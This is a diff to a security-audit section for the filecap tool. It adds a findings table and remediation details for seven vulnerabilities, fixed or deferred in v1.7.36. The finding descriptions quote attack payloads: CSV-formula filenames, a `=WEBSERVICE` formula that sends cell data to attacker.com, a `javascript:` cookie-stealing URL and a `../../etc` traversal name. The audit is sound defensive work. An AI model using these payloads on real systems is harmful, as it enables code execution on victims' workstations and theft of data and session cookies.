@@ -206,11 +206,65 @@ The ICJIA fleet snapshot at https://icjia-fleet-audit.netlify.app was reviewed f
 
 The deployment review did **not** find new findings beyond the 1.3.0 audit's residual-risk list. The Netlify Pro Site Password upgrade (compared to the 1.3.0 client-side gate) closes FC-2026-005 (unsalted-SHA-256 cracking risk) and FC-2026-014 (publicly-guessable bundle URL) — both were "documented" findings now mitigated by the server-side gate.
 
-### 2026-05-13 red/blue team re-audit (v1.7.35)
+### 2026-05-13 red/blue team re-audit (v1.7.35 → fixed in v1.7.36)
 
-A fresh adversarial pass against the current shipped version (`@icjia/filecap@1.7.35`) was completed 2026-05-13. **Zero Critical findings.** Seven findings total: three Moderate, three Low, one Informational. The biggest external-attacker risk is CSV-formula injection through filenames; everything else is insider / mis-configuration territory. Full report with threat models, where-to-fix locations, and one-line remediations:
+A fresh adversarial pass against `@icjia/filecap@1.7.35`. **Zero Critical findings.** Seven findings total: three Moderate, three Low, one Informational. Five were fixed in v1.7.36 (CHANGELOG covers the per-finding code change). Two are deferred — one mitigated by the Netlify Pro Site Password gate, one a future signing decision.
 
-→ [`docs/security-audit-2026-05-13.md`](docs/security-audit-2026-05-13.md)
+| # | Severity | Finding | Status |
+|---|---|---|---|
+| FC-2026-023 | Moderate | CSV-formula injection through filenames | **Fixed in 1.7.36** |
+| FC-2026-024 | Moderate | `<a href>` emitted without URL-scheme validation | **Fixed in 1.7.36** |
+| FC-2026-025 | Moderate | `sites.json` `name` field lacks slug-shape validation → path traversal | **Fixed in 1.7.36** |
+| FC-2026-026 | Low | `secrets.json` file-mode is not enforced | **Fixed in 1.7.36** (warn on load) |
+| FC-2026-027 | Low | Deploy bundle exposes internal server filesystem paths | Mitigated by Netlify Pro Site Password |
+| FC-2026-028 | Low | `webRollup.autoDeploy` silently pushes to production | **Fixed in 1.7.36** (banner + `FILECAP_NO_DEPLOY` opt-out) |
+| FC-2026-029 | Info | Bundle artefact integrity not signed or checksummed | Deferred (TLS covers transit-layer threat) |
+
+**Per-finding detail:**
+
+#### FC-2026-023 — CSV-formula injection through filenames (Moderate → Fixed)
+
+*Threat.* A filename like `=cmd|'/c calc'!A1.pdf`, `+SUM(1+1).pdf`, `@DDE(...)`, or a tab/CR-prefixed variant uploaded to a Strapi `/uploads/` directory flows into `audit-file-list-master.csv` via `csvCell`. A manager opens the CSV in Excel and the cell evaluates as a formula — RCE on the spreadsheet-opener's workstation in the worst case; data exfiltration via `=WEBSERVICE("attacker.com?"&A1)` in milder ones. CSVs are shared with external remediation vendors, so the attack reaches off-network targets too.
+
+*Fix in 1.7.36.* `csvCell` in `src/report/format.js` now prefixes cells whose first character is in `{= + - @ \t \r}` with a single quote (`'`). Excel / Sheets / Numbers strip the apostrophe on display, so the cell shows the filename unchanged but does not evaluate. The deliberate `="<sha256-hash>"` cell is allow-listed via a whole-cell pattern match (`/^="[^"\n]*"$/`) so the hash column still renders correctly. Five new tests cover the attack payloads.
+
+#### FC-2026-024 — `<a href>` emitted without URL-scheme validation (Moderate → Fixed)
+
+*Threat.* `htmlEscape` escapes `&<>"'` but does not validate the URL scheme. A malicious value in `sites.json` (`publicUrlBase`, `siteUrl`) or in scanned `entry.absolutePath` like `javascript:alert(document.cookie)` produces a clickable XSS-vector anchor in the bundle. Even though the bundle is password-gated, a click leaks the session cookie.
+
+*Fix in 1.7.36.* New `safeUrl(url)` helper in `src/report/html.js` returns the URL only when its parsed scheme is `http:` or `https:`. Both `<a href>` emit sites (publicUrl table cell + meta-grid Public URL row) now gate emission through `safeUrl()`. Values with bad schemes render as plain text (visible, not clickable).
+
+#### FC-2026-025 — `sites.json` `name` lacks slug-shape validation (Moderate → Fixed)
+
+*Threat.* `siteEntrySchema.name` was `z.string().min(1)` — any non-empty string passed. The value is interpolated into `path.join(auditsBase, siteKey, "latest", "inventory.ndjson")` and into the generated `_redirects` rules. A `name: "../../etc"` value caused traversal outside `~/filecap-audits/`. Insider / poisoned-shared-sites.json threat.
+
+*Fix in 1.7.36.* Schema tightened to `z.string().regex(/^[a-z0-9](?:[a-z0-9-]*[a-z0-9])?$/i)`. A `name: "../foo"` value now fails zod validation at load time, blocking the path-traversal vector at the schema layer.
+
+#### FC-2026-026 — `secrets.json` file-mode is not enforced (Low → Fixed via warn)
+
+*Threat.* `~/.filecap/secrets.json` carries bearer-token JWTs. Documented expected mode is `0600` but `loadSecrets()` did not check. A misconfigured file at `0644` (group/world readable) would load silently — on shared hosts, other users could read the tokens.
+
+*Fix in 1.7.36.* `loadSecrets()` stats the file on load; if `(mode & 0o077) !== 0` it emits a stderr warning naming the actual mode and a `chmod 600 …` remediation command. Doesn't refuse to load (single-user workstations are common); the warning is enough.
+
+#### FC-2026-027 — Deploy bundle exposes internal server filesystem paths (Low → Mitigated, no code fix)
+
+*Threat.* Per-site cards and detail pages show scanned-path values like `/home/forge/r3.icjia-api.cloud/strapi_v4/public/uploads`. Useful reconnaissance for an attacker who's gotten past the Netlify password gate (forwarded-link incident, share-with-vendor mishap).
+
+*Status.* Already mitigated by Netlify Pro Site Password (server-side gate, not the v1.5.6-era client-side hash). Redaction would be defense-in-depth only; the threat model already covers this. Deferred unless the gate is removed.
+
+#### FC-2026-028 — `webRollup.autoDeploy` silently pushes to production (Low → Fixed)
+
+*Threat.* With `webRollup.autoDeploy: true` in `~/.filecap/config.json`, every local `filecap web-rollup` invocation pushes to production Netlify. Developers running web-rollup as part of testing or local debugging silently published in-progress work twice during the 2026-05-13 development session.
+
+*Fix in 1.7.36.* `runNetlifyDeploy()` now prints a loud banner before invoking `netlify deploy --prod` so operators see the production push and can Ctrl-C if it wasn't intended. New `FILECAP_NO_DEPLOY=1` env var skips the deploy entirely — useful for tests, local regeneration, or any case where the user wants `web-rollup` to produce a bundle without pushing.
+
+#### FC-2026-029 — Bundle artefact integrity not signed or checksummed (Informational → Deferred)
+
+*Threat.* No `bundle.sig`. A downloader has no out-of-band way to verify the bytes weren't substituted by a man-in-the-middle.
+
+*Status.* Defer. TLS to Netlify covers the transit-layer threat; signing adds operational cost (key management, key rotation, vendor education) that isn't justified for the current "vendors fetch from a known TLS+password-gated URL" distribution model. Re-evaluate if distribution shifts to "vendors download from email or arbitrary mirrors."
+
+
 
 ### Audit findings summary (1.3.0 baseline)
 
